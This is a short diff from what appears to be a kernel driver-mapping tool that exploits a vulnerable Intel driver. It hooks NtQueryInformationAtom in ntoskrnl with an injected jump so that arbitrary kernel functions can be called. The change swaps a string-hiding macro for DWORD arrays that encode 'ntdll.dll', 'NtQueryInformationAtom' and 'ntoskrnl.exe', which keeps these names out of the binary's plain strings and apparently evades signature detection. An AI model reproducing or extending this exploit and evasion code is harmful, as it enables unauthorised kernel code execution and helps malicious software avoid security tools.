@@ -150,14 +150,20 @@ namespace intel_driver
 		if (!kernel_function_address)
 			return false;
 
+		DWORD ntdll_dll[] = { 0x6C64746E, 0x6C642E6C, 0x0000006C };
+
 		// Setup function call
-		HMODULE ntdll = GetModuleHandleA(HIDETXT("ntdll.dll"));
+		HMODULE ntdll = GetModuleHandleA((LPCSTR)ntdll_dll);
+
 		if (ntdll == 0) {
 			//TRACE("[-] Failed to load ntdll.dll"); //never should happens
 			return false;
 		}
 
-		const auto NtQueryInformationAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, HIDETXT("NtQueryInformationAtom")));
+		DWORD ntQueryInfomationAtom[] = { 0x7551744E, 0x49797265, 0x726F666E, 0x6974616D, 0x74416E6F, 0x00006D6F };
+		DWORD ntoskrnlExe[] = { 0x736F746E, 0x6C6E726B, 0x6578652E, 0x00000000 };
+
+		const auto NtQueryInformationAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, (LPCSTR)ntQueryInfomationAtom));
 		if (!NtQueryInformationAtom)
 		{
 			//TRACE("[-] Failed to get export ntdll.NtQueryInformationAtom");
@@ -168,7 +174,7 @@ namespace intel_driver
 		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
 		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
 
-		const uint64_t kernel_NtQueryInformationAtom = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress(HIDETXT("ntoskrnl.exe")), HIDETXT("NtQueryInformationAtom"));
+		const uint64_t kernel_NtQueryInformationAtom = GetKernelModuleExport(device_handle, utils::GetKernelModuleAddress((LPCSTR)ntoskrnlExe), (LPCSTR)ntQueryInfomationAtom);
 		if (!kernel_NtQueryInformationAtom)
 		{
 			//TRACE("[-] Failed to get export ntoskrnl.NtQueryInformationAtom");
